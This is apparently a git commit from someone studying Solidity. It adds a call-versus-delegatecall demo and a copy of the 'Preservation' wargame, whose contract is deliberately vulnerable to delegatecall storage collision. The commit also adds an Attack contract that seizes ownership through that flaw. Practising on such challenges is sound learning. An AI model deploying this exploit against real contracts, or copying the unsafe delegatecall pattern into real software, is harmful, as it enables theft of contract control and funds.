061446b442f43d723eb2d73779b8029d5203fd43
YingQm <yingqiumin@126.com>
2022-04-18 17:07:04 +0800

    update

---
+++ contracts/calltest.sol
@@ -0,0 +1,37 @@
+pragma solidity >=0.7.0 <0.9.0;
+
+// 在 https://remix.ethereum.org/ 下运行部署测试
+contract calltest {
+    address public b;
+    address public c;
+
+    event LogString(string, address, address);
+
+    function test() public returns (address a){
+        a=address(this);
+        b=a;
+        emit LogString("in test", address(this), msg.sender);
+    }
+}
+
+contract compare {
+    address public c;
+    address public b;
+
+    calltest public testaddress;
+    constructor(address addr) public {
+        testaddress = calltest(addr);
+    }
+
+    bytes4 internal constant TEST_SELECTOR = bytes4(
+        keccak256("test()")
+    );
+
+    function withcall()public{
+        address(testaddress).call(abi.encodeWithSelector(TEST_SELECTOR));
+    }
+
+    function withdelegatecall()public{
+        address(testaddress).delegatecall(abi.encodeWithSelector(TEST_SELECTOR));
+    }
+}
---
+++ contracts/preservation.sol
@@ -0,0 +1,47 @@
+pragma solidity >=0.7.0 <0.9.0;
+
+contract Preservation {
+    // public library contracts
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+    uint public storedTime;
+    // Sets the function signature for delegatecall
+    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
+
+    constructor(address timeA, address timeB) public {
+        timeZone1Library = timeA;
+        timeZone2Library = timeB;
+        owner = msg.sender;
+    }
+
+    // set the time for timezone 1
+    function setFirstTime(uint _timeStamp) public {
+        address(timeZone1Library).delegatecall(abi.encodeWithSelector(setTimeSignature, _timeStamp));
+    }
+
+    // set the time for timezone 2
+    function setSecondTime(uint _timeStamp) public {
+        address(timeZone2Library).delegatecall(abi.encodeWithSelector(setTimeSignature, _timeStamp));
+    }
+}
+
+// Simple library contract to set the time
+contract LibraryContract {
+    // stores a timestamp
+    uint public storedTime;
+
+    function setTime(uint _time) public {
+        storedTime = _time;
+    }
+}
+
+contract Attack {
+    uint padding1;
+    uint padding2;
+    address public owner;
+
+    function setTime(uint _time) public {
+        owner = tx.origin;
+    }
+}
